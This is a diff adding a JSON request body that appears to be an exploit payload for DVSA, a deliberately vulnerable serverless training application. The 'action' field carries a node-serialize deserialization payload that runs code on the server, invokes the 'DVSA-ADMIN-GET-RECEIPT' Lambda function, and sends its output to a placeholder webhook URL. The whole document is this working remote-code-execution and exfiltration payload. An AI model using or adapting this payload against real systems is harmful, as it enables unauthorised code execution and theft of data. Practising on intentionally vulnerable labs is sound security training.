@@ -1,0 +1,4 @@
+{
+  "action": "_$$ND_FUNC$$_function(){var aws=require('aws-sdk');var lambda=new aws.Lambda();var p={FunctionName:'DVSA-ADMIN-GET-RECEIPT',InvocationType:'RequestResponse',Payload:JSON.stringify({'year':'2018','month':'12'})};lambda.invoke(p).promise().then(function(d){var h=require('http');h.get('http://<your-webhook-url>?data='+encodeURIComponent(JSON.stringify(d)));});}()",
+  "cart_id": "test"
+}
